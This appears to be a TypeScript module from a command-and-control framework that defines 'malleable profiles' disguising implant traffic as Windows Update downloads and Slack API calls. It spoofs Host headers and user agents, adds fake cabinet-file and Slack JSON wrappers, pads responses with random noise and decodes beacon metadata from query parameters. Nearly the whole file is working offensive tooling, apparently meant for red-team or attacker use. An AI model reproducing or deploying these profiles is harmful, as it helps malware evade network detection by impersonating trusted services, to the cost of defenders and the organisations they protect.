import crypto from "node:crypto";

export interface MalleableProfile {
  name: string;
  httpGet: {
    uri: string[];
    client: {
      header: Record<string, string>;
      metadata: {
        parameter: string;
        encoding: "base64" | "hex" | "netbios" | "aes";
      };
    };
    server: {
      header: Record<string, string>;
      output: {
        prepend: string;
        append: string;
        transform?: (data: string) => string;
      };
    };
  };
  httpPost: {
    uri: string[];
    client: {
      header: Record<string, string>;
      id: {
        parameter: string;
      };
      output: {
        prepend: string;
        append: string;
      };
    };
  };
}

/**
 * PhonkAlphabet's Malleable Profiles
 * Mimicking high-traffic legitimate services with precision.
 */

export const MicrosoftUpdateProfile: MalleableProfile = {
  name: "ms_update",
  httpGet: {
    uri: [
      "/v10/windowsupdate/a/selfupdate/WSUS3/x64/Other/7.6.7600.256/agent.cab",
      "/v10/windowsupdate/events/reporting.ashx",
    ],
    client: {
      header: {
        Host: "sws.update.microsoft.com",
        "User-Agent": "Windows-Update-Agent/10.0.19041.1",
        Accept: "*/*",
        Connection: "Keep-Alive",
      },
      metadata: {
        parameter: "id",
        encoding: "hex",
      },
    },
    server: {
      header: {
        "Content-Type": "application/octet-stream",
        Server: "Microsoft-IIS/10.0",
        "X-Powered-By": "ASP.NET",
      },
      output: {
        prepend: "MSCF\0\0\0\0", // Cabinet file header
        append: "\0\0\0\0",
      },
    },
  },
  httpPost: {
    uri: ["/v10/windowsupdate/reporting/report.ashx"],
    client: {
      header: {
        Host: "sws.update.microsoft.com",
        "Content-Type": "application/soap+xml; charset=utf-8",
      },
      id: {
        parameter: "session",
      },
      output: {
        prepend:
          '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">',
        append: "</s:Envelope>",
      },
    },
  },
};

export const SlackProfile: MalleableProfile = {
  name: "slack_api",
  httpGet: {
    uri: ["/api/rtm.connect", "/api/users.counts", "/api/channels.list"],
    client: {
      header: {
        Host: "slack.com",
        "User-Agent": "Slack-ImgProxy 1.0 (+https://api.slack.com/robots)",
        Accept: "application/json",
      },
      metadata: {
        parameter: "token",
        encoding: "base64",
      },
    },
    server: {
      header: {
        "Content-Type": "application/json; charset=utf-8",
        Server: "Apache",
        "Access-Control-Allow-Origin": "*",
      },
      output: {
        prepend:
          '{"ok":true,"url":"wss://cerberus-xxxx.slack.com/","team":{"id":"T012345","name":"RedTeam"},"self":{"id":"U012345","name":"ghost"},"data":"',
        append: '"}',
      },
    },
  },
  httpPost: {
    uri: ["/api/chat.postMessage"],
    client: {
      header: {
        Host: "slack.com",
        "Content-Type": "application/x-www-form-urlencoded",
      },
      id: {
        parameter: "channel",
      },
      output: {
        prepend: "token=xoxb-xxxx&text=",
        append: "",
      },
    },
  },
};

export class MalleableEngine {
  static transformResponse(data: string, profile: MalleableProfile): string {
    // PhonkAlphabet: Add extra entropy to the transformed response
    const noise = crypto.randomBytes(crypto.randomInt(16, 65)).toString("hex");
    return `${profile.httpGet.server.output.prepend}${data}${profile.httpGet.server.output.append}/*${noise}*/`;
  }

  static extractMetadata(req: any, profile: MalleableProfile): string {
    const raw = req.query[profile.httpGet.client.metadata.parameter];
    if (!raw) return "";

    try {
      if (profile.httpGet.client.metadata.encoding === "base64") {
        return Buffer.from(raw, "base64").toString("utf8");
      }
      if (profile.httpGet.client.metadata.encoding === "hex") {
        return Buffer.from(raw, "hex").toString("utf8");
      }
    } catch (e) {
      return "";
    }
    return raw;
  }
}
